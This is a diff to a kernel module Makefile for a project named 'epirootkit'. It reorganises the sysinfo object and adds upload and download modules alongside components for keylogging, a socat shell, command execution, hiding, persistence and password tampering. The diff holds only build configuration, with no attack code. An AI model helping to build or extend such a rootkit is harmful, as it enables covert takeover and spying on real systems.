@@ -13,7 +13,8 @@ ccflags-y := 								    \
     -I$(src)/utils/io 					        \
     -I$(src)/utils/ulist 				        \
     -I$(src)/persist     				        \
-    -I$(src)/utils/crypto                             
+    -I$(src)/utils/crypto                       \
+    -I$(src)/utils/sysinfo                   
 
 obj-m    := epirootkit.o
 
@@ -21,11 +22,9 @@ epirootkit-objs :=                              \
     main.o                                      \
     userland.o                                  \
     socat.o                                     \
-    file_ops.o                                  \
     epikeylog.o                                 \
     cmd.o                                       \
     vanish.o                                    \
-    utils/sysinfo.o                             \
 	utils/crypto/hash.o                         \
 	utils/crypto/aes.o                          \
     network/core/network.o                      \
@@ -46,7 +45,10 @@ epirootkit-objs :=                              \
     interceptor/misc/ghost.o                    \
     utils/io/io.o                               \
     utils/ulist/ulist.o                         \
-    passwd/passwd.o
+    passwd/passwd.o                             \
+    utils/sysinfo/sysinfo.o                     \
+    upload.o                                    \
+    download.o
 
 all: modules
 
